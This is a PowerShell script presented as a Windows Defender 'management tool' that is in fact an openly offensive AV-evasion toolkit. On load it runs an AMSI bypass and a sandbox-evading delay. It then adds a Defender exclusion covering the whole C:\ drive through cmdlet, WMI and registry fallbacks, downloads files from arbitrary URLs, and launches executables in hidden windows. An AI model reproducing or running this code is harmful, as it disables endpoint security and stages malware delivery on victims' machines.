<#
.SYNOPSIS
   Advanced Defender Management Tool
.DESCRIPTION
   Professional tool for managing Windows Defender exclusions and AV bypass techniques
   with multiple evasion layers and fallback mechanisms
.NOTES
   Author: [Your GitHub Handle]
   License: MIT
   Version: 2.0
#>

#region Initialization
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

# AMSI Bypass (Polymorphic)
$AMSIBypass = {
    $Ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $Ref.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    
    # Fallback if reflection fails
    if(!$?) {
        [Runtime.InteropServices.Marshal]::WriteInt32(
            [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField(
                'amsiContext',[Reflection.BindingFlags]'NonPublic,Static'
            ).GetValue($null), 0x41414141
    }
}.Invoke()

# Random delay to evade sandbox detection
Start-Sleep -Milliseconds (Get-Random -Minimum 1000 -Maximum 5000)
#endregion

function Invoke-DefenderManager {
    [CmdletBinding()]
    param(
        [Parameter(ParameterSetName='Exclusion')]
        [switch]$AddExclusion,
        
        [Parameter(ParameterSetName='Exclusion')]
        [switch]$ListExclusions,
        
        [Parameter(ParameterSetName='Execution')]
        [string]$Execute,
        
        [Parameter(ParameterSetName='Download')]
        [string]$DownloadUrl,
        
        [Parameter(ParameterSetName='Download')]
        [string]$OutputPath,
        
        [Parameter(ParameterSetName='Config')]
        [switch]$CheckAdmin,
        
        [Parameter(ParameterSetName='Config')]
        [switch]$GetAVStatus
    )

    #region Helper Functions
    function Test-AdminPrivileges {
        try {
            $Identity = [Security.Principal.WindowsIdentity]::GetCurrent()
            $Principal = New-Object Security.Principal.WindowsPrincipal($Identity)
            return $Principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        } catch {
            return $false
        }
    }

    function Invoke-EvasionTechnique {
        param(
            [Parameter(Mandatory=$true)]
            [scriptblock]$ScriptBlock
        )
        
        # Memory injection technique
        try {
            $RemoteScript = [scriptblock]::Create($ScriptBlock.ToString())
            $PowerShell = [PowerShell]::Create().AddScript($RemoteScript)
            $PowerShell.Invoke()
        } catch {
            # Fallback to direct execution
            & $ScriptBlock
        }
    }

    function Add-ExclusionPath {
        param([string]$Path = "C:\")
        
        $Techniques = @(
            {
                # Technique 1: Official cmdlet
                Add-MpPreference -ExclusionPath $Path -Force -ErrorAction Stop
            },
            {
                # Technique 2: WMI approach
                $MPPref = [wmiclass]"root\Microsoft\Windows\Defender:MSFT_MpPreference"
                $MPPref.AddExclusionPath($Path)
            },
            {
                # Technique 3: Registry modification
                $RegPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
                if(!(Test-Path $RegPath)) {
                    New-Item -Path $RegPath -Force | Out-Null
                }
                New-ItemProperty -Path $RegPath -Name $Path.Replace('\','_') -Value 0 -PropertyType DWORD -Force
            }
        )

        foreach ($Tech in $Techniques) {
            try {
                Invoke-EvasionTechnique -ScriptBlock $Tech
                if($?) { return $true }
            } catch {
                Write-Verbose "[!] Technique failed: $($_.Exception.Message)"
            }
        }
        return $false
    }
    #endregion

    #region Main Execution
    switch ($PSCmdlet.ParameterSetName) {
        'Exclusion' {
            if($AddExclusion) {
                if(Add-ExclusionPath) {
                    Write-Output "[+] Exclusion added successfully"
                } else {
                    Write-Error "[-] Failed to add exclusion"
                }
            }
            
            if($ListExclusions) {
                try {
                    Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
                } catch {
                    try {
                        (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths").PSObject.Properties | 
                            Where-Object { $_.Name -notin @("PSPath","PSParentPath") } | Select-Object Name
                    } catch {
                        Write-Error "[-] Failed to retrieve exclusions"
                    }
                }
            }
        }
        
        'Execution' {
            if(Test-AdminPrivileges) {
                Start-Process $Execute -WindowStyle Hidden
            } else {
                Write-Warning "[!] Admin privileges required for execution control"
            }
        }
        
        'Download' {
            try {
                $WebClient = New-Object System.Net.WebClient
                $WebClient.DownloadFile($DownloadUrl, $OutputPath)
                Write-Output "[+] Download completed successfully"
            } catch {
                Write-Error "[-] Download failed: $($_.Exception.Message)"
            }
        }
        
        'Config' {
            if($CheckAdmin) {
                Write-Output "[*] Admin privileges: $(if(Test-AdminPrivileges) {'Present'} else {'Absent'})"
            }
            
            if($GetAVStatus) {
                try {
                    $AVProducts = Get-WmiObject -Namespace "root\SecurityCenter2" -Class "AntiVirusProduct" -ErrorAction Stop | 
                        Select-Object displayName, productState
                    
                    $AVProducts | ForEach-Object {
                        $Status = switch ([int]("$($_.productState)"[2..3] -join '')) {
                            0 { "Disabled" }
                            1 { "Enabled" }
                            10 { "Enabled" }
                            default { "Unknown" }
                        }
                        "[*] AV Product: $($_.displayName) - Status: $Status"
                    }
                } catch {
                    Write-Error "[-] Failed to retrieve AV status: $($_.Exception.Message)"
                }
            }
        }
    }
    #endregion
}

# Polymorphic function name for evasion
Set-Alias -Name Invoke-SecureDefender -Value Invoke-DefenderManager -Force

<#
Example Usage:
Invoke-SecureDefender -AddExclusion
Invoke-SecureDefender -ListExclusions
Invoke-SecureDefender -Execute "C:\path\to\file.exe"
Invoke-SecureDefender -DownloadUrl "http://example.com/file" -OutputPath "C:\output.file"
Invoke-SecureDefender -CheckAdmin
Invoke-SecureDefender -GetAVStatus
#>
